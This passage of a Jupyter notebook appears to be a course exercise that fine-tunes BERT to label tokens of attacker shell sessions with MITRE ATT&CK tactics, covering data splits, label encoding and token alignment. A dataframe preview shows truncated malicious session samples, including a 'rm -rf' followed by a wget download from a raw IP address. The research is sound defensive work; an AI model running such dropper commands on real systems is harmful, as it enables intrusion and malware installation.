       "        docLink.innerHTML = docLinkHtml;\n",
       "        element.appendChild(docLink);\n",
       "      }\n",
       "    </script>\n",
       "  </div>\n",
       "\n",
       "\n",
       "    <div id=\"df-41c0e229-5fac-4576-a6d0-993debee0a73\">\n",
       "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-41c0e229-5fac-4576-a6d0-993debee0a73')\"\n",
       "                title=\"Suggest charts\"\n",
       "                style=\"display:none;\">\n",
       "\n",
       "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
       "     width=\"24px\">\n",
       "    <g>\n",
       "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
       "    </g>\n",
       "</svg>\n",
       "      </button>\n",
       "\n",
       "<style>\n",
       "  .colab-df-quickchart {\n",
       "      --bg-color: #E8F0FE;\n",
       "      --fill-color: #1967D2;\n",
       "      --hover-bg-color: #E2EBFA;\n",
       "      --hover-fill-color: #174EA6;\n",
       "      --disabled-fill-color: #AAA;\n",
       "      --disabled-bg-color: #DDD;\n",
       "  }\n",
       "\n",
       "  [theme=dark] .colab-df-quickchart {\n",
       "      --bg-color: #3B4455;\n",
       "      --fill-color: #D2E3FC;\n",
       "      --hover-bg-color: #434B5C;\n",
       "      --hover-fill-color: #FFFFFF;\n",
       "      --disabled-bg-color: #3B4455;\n",
       "      --disabled-fill-color: #666;\n",
       "  }\n",
       "\n",
       "  .colab-df-quickchart {\n",
       "    background-color: var(--bg-color);\n",
       "    border: none;\n",
       "    border-radius: 50%;\n",
       "    cursor: pointer;\n",
       "    display: none;\n",
       "    fill: var(--fill-color);\n",
       "    height: 32px;\n",
       "    padding: 0;\n",
       "    width: 32px;\n",
       "  }\n",
       "\n",
       "  .colab-df-quickchart:hover {\n",
       "    background-color: var(--hover-bg-color);\n",
       "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
       "    fill: var(--button-hover-fill-color);\n",
       "  }\n",
       "\n",
       "  .colab-df-quickchart-complete:disabled,\n",
       "  .colab-df-quickchart-complete:disabled:hover {\n",
       "    background-color: var(--disabled-bg-color);\n",
       "    fill: var(--disabled-fill-color);\n",
       "    box-shadow: none;\n",
       "  }\n",
       "\n",
       "  .colab-df-spinner {\n",
       "    border: 2px solid var(--fill-color);\n",
       "    border-color: transparent;\n",
       "    border-bottom-color: var(--fill-color);\n",
       "    animation:\n",
       "      spin 1s steps(1) infinite;\n",
       "  }\n",
       "\n",
       "  @keyframes spin {\n",
       "    0% {\n",
       "      border-color: transparent;\n",
       "      border-bottom-color: var(--fill-color);\n",
       "      border-left-color: var(--fill-color);\n",
       "    }\n",
       "    20% {\n",
       "      border-color: transparent;\n",
       "      border-left-color: var(--fill-color);\n",
       "      border-top-color: var(--fill-color);\n",
       "    }\n",
       "    30% {\n",
       "      border-color: transparent;\n",
       "      border-left-color: var(--fill-color);\n",
       "      border-top-color: var(--fill-color);\n",
       "      border-right-color: var(--fill-color);\n",
       "    }\n",
       "    40% {\n",
       "      border-color: transparent;\n",
       "      border-right-color: var(--fill-color);\n",
       "      border-top-color: var(--fill-color);\n",
       "    }\n",
       "    60% {\n",
       "      border-color: transparent;\n",
       "      border-right-color: var(--fill-color);\n",
       "    }\n",
       "    80% {\n",
       "      border-color: transparent;\n",
       "      border-right-color: var(--fill-color);\n",
       "      border-bottom-color: var(--fill-color);\n",
       "    }\n",
       "    90% {\n",
       "      border-color: transparent;\n",
       "      border-bottom-color: var(--fill-color);\n",
       "    }\n",
       "  }\n",
       "</style>\n",
       "\n",
       "      <script>\n",
       "        async function quickchart(key) {\n",
       "          const quickchartButtonEl =\n",
       "            document.querySelector('#' + key + ' button');\n",
       "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
       "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
       "          try {\n",
       "            const charts = await google.colab.kernel.invokeFunction(\n",
       "                'suggestCharts', [key], {});\n",
       "          } catch (error) {\n",
       "            console.error('Error during call to suggestCharts:', error);\n",
       "          }\n",
       "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
       "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
       "        }\n",
       "        (() => {\n",
       "          let quickchartButtonEl =\n",
       "            document.querySelector('#df-41c0e229-5fac-4576-a6d0-993debee0a73 button');\n",
       "          quickchartButtonEl.style.display =\n",
       "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
       "        })();\n",
       "      </script>\n",
       "    </div>\n",
       "\n",
       "    </div>\n",
       "  </div>\n"
      ],
      "text/plain": [
       "                                             session  \\\n",
       "0  rm -rf /var/run/1sh ; wget -c http://71.127.14...   \n",
       "1  cat /proc/cpuinfo | grep name | wc -l ; echo r...   \n",
       "\n",
       "                                               label  \n",
       "0  [Execution, Execution, Execution, Execution, E...  \n",
       "1  [Discovery, Discovery, Discovery, Discovery, D...  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "train_df = pd.read_json(f\"{data_path}/train.json\")\n",
    "test_df = pd.read_json(f\"{data_path}/test.json\")\n",
    "print(f\"The dataset contains {train_df.shape[0]:,} elements\")\n",
    "train_df.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c09a46e0",
   "metadata": {},
   "source": [
    "Fine-tune a BERT model for Named Entity Recognition. Load the pre-trained model with\n",
    "pre-trained weights from Huggingface. Focus on a token-classification task: The model\n",
    "will try to classify each token into one of the MITRE Tactics. Compute the following\n",
    "metrics:\n",
    "1. Token classification accuracy.\n",
    "2. Macro token classification precision, recall, and f1-score.\n",
    "3. Per-class f1-score: reports the results in a barplot.\n",
    "4. Average session ‘fidelity’: for each session, the model predicts some tokens correctly.\n",
    "\n",
    "For each session, the ‘fidelity’ score is calculated as a fraction between the num-\n",
    "ber of correct predictions and the total number of tokens (e.g. for the session ‘cat\n",
    "cpu/procinfo;’ with the tags [‘Discovery’, ‘Discovery’, ‘Discovery’] and the predic-\n",
    "tion [‘Discovery’, ‘Discovery’, ‘Execution’], the fidelity is 32 = 0.67).\n",
    "Calculate the average fidelity for all test sessions.\n",
    "\n",
    "Q: Can the model achieve \"good\" results with only 251 training labeled samples? Where\n",
    "does it have the most difficulties?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d5c6570a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "New training dataset contains 200 elements\n",
      "Validation dataset contains 51 elements\n"
     ]
    }
   ],
   "source": [
    "train_df, val_df = train_test_split(train_df, test_size=0.2, random_state=42)\n",
    "print(f\"New training dataset contains {train_df.shape[0]:,} elements\")\n",
    "print(f\"Validation dataset contains {val_df.shape[0]:,} elements\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a294d553",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Dataset({\n",
       "    features: ['session', 'label'],\n",
       "    num_rows: 200\n",
       "})"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Convert the training DATAFRAME into an huggingface DATASET\n",
    "train_ds = Dataset.from_pandas(train_df.reset_index(drop=True))\n",
    "train_ds"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f07d0ef",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "DatasetDict({\n",
       "    train: Dataset({\n",
       "        features: ['session', 'label'],\n",
       "        num_rows: 200\n",
       "    })\n",
       "    valid: Dataset({\n",
       "        features: ['session', 'label'],\n",
       "        num_rows: 51\n",
       "    })\n",
       "    test: Dataset({\n",
       "        features: ['session', 'label'],\n",
       "        num_rows: 108\n",
       "    })\n",
       "})"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "full_ds = DatasetDict(\n",
    "    {\n",
    "        \"train\": Dataset.from_pandas(train_df.reset_index(drop=True)),\n",
    "        \"valid\": Dataset.from_pandas(val_df.reset_index(drop=True)),\n",
    "        \"test\": Dataset.from_pandas(test_df.reset_index(drop=True)),\n",
    "    }\n",
    ")\n",
    "full_ds"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1f240208",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['Execution', 'Discovery', 'Not Malicious Yet', 'Persistence', 'Other', 'Defense Evasion', 'Impact']\n"
     ]
    }
   ],
   "source": [
    "# 1. Extract the labels\n",
    "unique_labels = list(train_df.label.explode().unique())\n",
    "print(unique_labels)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2b04bb3c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'Execution': 0, 'Discovery': 1, 'Not Malicious Yet': 2, 'Persistence': 3, 'Other': 4, 'Defense Evasion': 5, 'Impact': 6}\n"
     ]
    }
   ],
   "source": [
    "# 2. Obtain a dictionary that maps the labels into identifiers (Labels Encoder)\n",
    "id2label = {it:label for it, label in enumerate(unique_labels)}\n",
    "label2id = {label:it for it, label in enumerate(unique_labels)}\n",
    "print(label2id)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "004264dd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "191194f2eeb84ad59fdcec6b581d3691",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/200 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7b544f0c978d43d195418db56119cf02",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/51 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "48da9f31c0f04ba3b5ad6921f4209ce0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/108 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "DatasetDict({\n",
       "    train: Dataset({\n",
       "        features: ['session', 'label', 'label_id'],\n",
       "        num_rows: 200\n",
       "    })\n",
       "    valid: Dataset({\n",
       "        features: ['session', 'label', 'label_id'],\n",
       "        num_rows: 51\n",
       "    })\n",
       "    test: Dataset({\n",
       "        features: ['session', 'label', 'label_id'],\n",
       "        num_rows: 108\n",
       "    })\n",
       "})"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "def convert_labels_to_ids(sample):\n",
    "    sample['label_id'] = [label2id[el] for el in sample[\"label\"]]\n",
    "    return sample\n",
    "# Apply the mapping function to all splits of your dataset\n",
    "encoded_dataset = full_ds.map(convert_labels_to_ids)\n",
    "encoded_dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "afc57269",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Example:\n",
      "Original label: ['Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Persistence', 'Persistence', 'Persistence', 'Persistence', 'Persistence', 'Persistence', 'Persistence', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery', 'Discovery']\n",
      "Converted label: [1, 1, 1, 1, 1, 1, 1, 1, 1, 3, 3, 3, 3, 3, 3, 3, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\n"
     ]
    }
   ],
   "source": [
    "print(\"Example:\")\n",
    "EXAMPLE_ID = 3\n",
    "print(f'Original label: {encoded_dataset[\"train\"][EXAMPLE_ID][\"label\"]}')\n",
    "print(f'Converted label: {encoded_dataset[\"train\"][EXAMPLE_ID][\"label_id\"]}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1807366a",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/usr/local/lib/python3.12/dist-packages/huggingface_hub/utils/_auth.py:94: UserWarning: \n",
      "The secret `HF_TOKEN` does not exist in your Colab secrets.\n",
      "To authenticate with the Hugging Face Hub, create a token in your settings tab (https://huggingface.co/settings/tokens), set it as secret in your Google Colab and restart your session.\n",
      "You will be able to reuse this secret in all of your notebooks.\n",
      "Please note that authentication is recommended but still optional to access public models or datasets.\n",
      "  warnings.warn(\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b9035d4fa88146999abd350af7bb8dc6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "tokenizer_config.json:   0%|          | 0.00/48.0 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8a2d7093430e4cc7b38c63f68666fa8d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "config.json:   0%|          | 0.00/570 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "19e3835d96cd4083889f12cdcdebf0d9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "vocab.txt: 0.00B [00:00, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f7a435904f22418482d8032884ae5a6a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "tokenizer.json: 0.00B [00:00, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "model = \"google-bert/bert-base-uncased\"\n",
    "tokenizer = AutoTokenizer.from_pretrained(model)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d9d3bcea",
   "metadata": {},
   "source": [
    "Create a function that aligns the labels with the tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e8ba5b2c",
   "metadata": {},
   "outputs": [],
   "source": [
    "def align_labels_with_tokens(labels, word_ids):\n",
    "    \"\"\"Aligns token-level labels with word-level labels for tokenized text.\n",
    "\n",
    "    This function maps word-level labels to their corresponding tokens after tokenization.\n",
    "    It handles special tokens (with None word_ids) and subword tokens (multiple tokens for one word).\n",
    "    Args:\n",
    "       labels (list): Original word-level labels.\n",
    "       word_ids (list): List of word indices that each token corresponds to.\n",
    "                        None values represent special tokens.\n",
    "    Returns:\n",
    "       list: New token-aligned labels where:\n",
    "            - Special tokens (None word_ids) are assigned -100\n",
    "            - First token of each word gets the word's label\n",
    "            - Continuation tokens of the same word also get the word's label\n",
    "    Example:\n",
    "       labels = [0, 1, 2]  # Labels for 3 words\n",
    "       word_ids = [None, 0, 0, 1, 2, 2, None]  # Tokenized into 7 tokens\n",
    "       result = [-100, 0, 0, 1, 2, 2, -100]  # Aligned labels\n",
    "    \"\"\"\n",
    "    new_labels = []\n",
    "    current_word = None\n",
    "    for word_id in word_ids:\n",
    "        if word_id != current_word:\n",
    "            # Start of a new word or special token\n",
    "            current_word = word_id\n",
    "            # Use -100 for special tokens, otherwise use the original label\n",
    "            label = -100 if word_id is None else labels[word_id]\n",
    "            new_labels.append(label)\n",
    "        elif word_id is None:\n",
    "            # Special token (like [CLS], [SEP], etc.)\n",
    "            new_labels.append(-100)\n",
    "        else:\n",
    "            # Continuation token of the current word\n",
    "            # We assign the same label as the word\n",
    "            label = labels[word_id]\n",
    "            new_labels.append(label)\n",
    "    return new_labels"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7e77934b",
   "metadata": {},
   "source": [
    "Now create a function that, for each sample:\n",
    "1) Tokenize the input\n",
    "2) Align the tokens with the corresponding tags"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c0b29178",
   "metadata": {},
   "outputs": [],
   "source": [
    "def tokenize_and_align_labels(samples):\n",
    "    \"\"\"Tokenizes text examples and aligns their labels with the resulting tokens.\n",
    "    This function processes a batch of examples by:\n",
    "    1. Tokenizing the text in 'sentences' field\n",
    "    2. Converting word-level labels to token-level labels for each example\n",
    "    3. Adding the aligned labels back to the tokenized inputs\n",
    "    Args:\n",
    "       examples (dict): Dictionary containing:\n",
    "           - 'sentences': List of text sentences\n",
    "           - 'tags_id': List of lists containing word-level tags for each command\n",
    "    Returns:\n",
    "       dict: Tokenized inputs with aligned labels:\n",
    "           - Standard tokenizer outputs (input_ids, attention_mask, etc.)\n",
    "           - 'labels': Token-level labels aligned with the tokenized inputs\n",
    "    Notes:\n",
    "       - Uses a pre-defined tokenizer (must be available in scope)\n",
    "       - Sets is_split_into_words=True because input is already word-tokenized\n",
    "       - Uses align_labels_with_tokens helper function to handle subword tokenization\n",
    "    \"\"\"\n",
    "    # Remember: we need to split the sentences\n",
    "    split_sentences = [sentence.split(\" \") for sentence in samples[\"session\"]]\n",
    "    # Tokenize all examples in batch using the global tokenizer\n",
    "    tokenized_inputs = tokenizer(\n",
    "        split_sentences,\n",
    "        truncation=True,  # Truncate to max length if needed\n",
    "        is_split_into_words=True  # Input is already split into words\n",
    "    )\n",
    "    # Extract all tags_id lists from the examples\n",
    "    all_tags = samples[\"label_id\"]\n",
    "    new_labels = []\n",
    "    # Process each example's labels individually\n",
    "    for i, tags in enumerate(all_tags):\n",
    "        # Get word ID mapping for the current example\n",
    "        word_ids = tokenized_inputs.word_ids(i)\n",
    "        # Convert word-level tags to token-level tags\n",
    "        aligned_labels = align_labels_with_tokens(tags, word_ids)\n",
    "        new_labels.append(aligned_labels)\n",
    "    # Add the aligned labels to the tokenized inputs\n",
    "    tokenized_inputs[\"labels\"] = new_labels\n",
    "    return tokenized_inputs"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd6d653b",
   "metadata": {},
   "source": [
    "Eventually, use the `map` function provided by the huggingface Dataset\n",
    "\n",
    "Notice: it already works on ALL the partitions (`train`, `validation` and `test`)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0322b3bf",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6c412edb739f4eaa9ad23598cc034fd3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/200 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "40c5936c113345bdb7ee464e24168934",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/51 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1d2904c24b704bb499f7ab8282c3d686",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/108 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "DatasetDict({\n",
       "    train: Dataset({\n",
       "        features: ['input_ids', 'token_type_ids', 'attention_mask', 'labels'],\n",
       "        num_rows: 200\n",
       "    })\n",
       "    valid: Dataset({\n",
       "        features: ['input_ids', 'token_type_ids', 'attention_mask', 'labels'],\n",
       "        num_rows: 51\n",
       "    })\n",
       "    test: Dataset({\n",
       "        features: ['input_ids', 'token_type_ids', 'attention_mask', 'labels'],\n",
       "        num_rows: 108\n",
       "    })\n",
       "})"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "original_columns = encoded_dataset[\"train\"].column_names\n",
    "tokenized_datasets = encoded_dataset.map(\n",
    "    tokenize_and_align_labels,\n",
    "    batched=True, # Can be performed in batches, in order to speed up times!\n",
    "    remove_columns=original_columns, # To remove the original columns\n",
    ")\n",
    "tokenized_datasets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3acd923b",
   "metadata": {},
   "outputs": [],
   "source": [
    "data_collator = DataCollatorForTokenClassification(tokenizer=tokenizer)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b3bcbc4",
   "metadata": {},
   "outputs": [],
   "source": [
    "train_dataloader = DataLoader(\n",
    "    tokenized_datasets[\"train\"],\n",
    "    shuffle=True,\n",
    "    collate_fn=data_collator,\n",
    "    batch_size=16,\n",
    ")\n",
    "eval_dataloader = DataLoader(\n",
    "    tokenized_datasets[\"valid\"], collate_fn=data_collator, batch_size=16\n",
    ")\n",
    "test_dataloader = DataLoader(\n",
    "    tokenized_datasets[\"test\"], collate_fn=data_collator, batch_size=16\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3fb3de2d",
   "metadata": {},
   "source": [
    "## Start"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d547ea22",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
